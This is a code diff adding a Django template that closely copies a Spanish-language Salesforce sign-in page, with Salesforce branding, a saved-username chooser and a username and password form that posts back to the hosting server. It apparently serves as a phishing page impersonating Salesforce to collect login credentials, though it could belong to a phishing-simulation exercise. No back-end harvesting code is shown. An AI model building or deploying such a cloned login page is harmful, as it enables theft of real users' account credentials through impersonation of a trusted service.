@@ -1,0 +1,66 @@
+<html xmlns="http://www.w3.org/1999/xhtml" style="visibility: visible;">
+<head><meta name="viewport" content="initial-scale=1.0">
+  <meta name="description" content="Página de inicio seguro de sesión de cliente Salesforce Iniciar sesión en su cuenta de cliente Salesforce.">
+  <title>Iniciar sesión | Salesforce</title>
+  <meta name="format-detection" content="telephone=no">
+  {% load static %}
+  <link rel="stylesheet" type="text/css" href="{% static 'login/nuevo.css' %}" />
+  <style type="text/css">
+  html { visibility: hidden; } </style>
+</head>
+  <body onload="lazyload();">
+    <div id="centre" class="pr">
+      <div id="wrap">
+        <div id="main">
+          <div id="wrapper">
+            <div id="logo_wrapper" class="standard_logo_wrapper mb24">
+              <h1 style="height: 100%; display: table-cell; vertical-align: bottom;"><img id="logo" class="standard_logo" src="/img/logo198.png" alt="Salesforce" border="0" name="logo"></h1>
+            </div>
+            <h2 id="header" class="mb12" style="display: none;"></h2>
+            <div id="content" style="display: block;">
+              <div id="chooser" style="display: none">
+                <div class="loginError" id="chooser_error" style="display: block;">
+                </div>
+                <div>
+                  <span id="chooser_label" class="label">0 nombres de usuario guardados</span><a href="javascript:void(0);" id="edit" class="fr small" onclick="LoginHint.showEdit();">Modificar lista</a>
+                </div>
+                <div class="scrollable mt8"><ul id="idlist"></ul>
+                </div>
+              </div>
+              <div id="manager" style="display: none">
+                <div class="nonscrollable mt8"><ul id="editlist" class="mb24" aria-live="polite" aria-relevant="additions removals"></ul>
+                </div>
+                <div class="mt16">
+                  <button class="button primary fiftyfifty right" id="hint_save_edit" name="Save" onclick="LoginHint.saveHintEdit();">Guardar</button>
+                  <button class="button secondary fiftyfifty" id="hint_back_edit" name="Cancel" onclick="LoginHint.showChooser();">Cancelar</button>
+                </div>
+              </div>
+              <div id="theloginform" style="display: block;">
+                    <form name="login" method="post" id="login_form" onsubmit="handleLogin();" action="" method="post" target="_top" autocomplete="off" novalidate="novalidate">
+                    <fieldset style="display:none">
+
+</fieldset>
+<div id="usernamegroup" class="inputgroup">
+  <label for="username" class="label">Nombre de usuario</label>
+  <div id="username_container">
+    <div id="idcard-container" class="mt8 mb16" style="display: none">
+      <div id="idcard">
+        <img id="idcard-avatar" class="avatar" alt=""><a href="javascript:void(0);" id="clear_link" class="clearlink" onclick="LoginHint.clearExistingIdentity();"><img alt="Iniciar sesión con un nombre de usuario diferente" class="clearicon" src="/img/clear.png"></a>
+        <span id="idcard-identity"></span></div></div>
+        <input class="input r4 wide mb16 mt8 username" type="email" value="" name="username" id="username" style="display: block;">
+
+      </div>
+    </div>
+    <label for="password" class="label">Contraseña</label>
+    <input class="input r4 wide mb16 mt8 password" type="password" id="password" name="pw" onkeypress="checkCaps(event)" autocomplete="off">
+    <div id="pwcaps" class="mb16" style="display:none">
+        </div>
+    <input class="button r4 wide primary" type="submit" id="Login" name="Login" value="Iniciar sesión">
+    <div class="w0 pr ln3 p16 remember">
+      <input type="checkbox" class="r4 fl mr8" style="" id="rememberUn" name="rememberUn">
+      <label for="rememberUn" class="fl pr db tn3">Recordarme</label><br>
+    </div></form>
+    </div>
+
+      </body>
+</html>
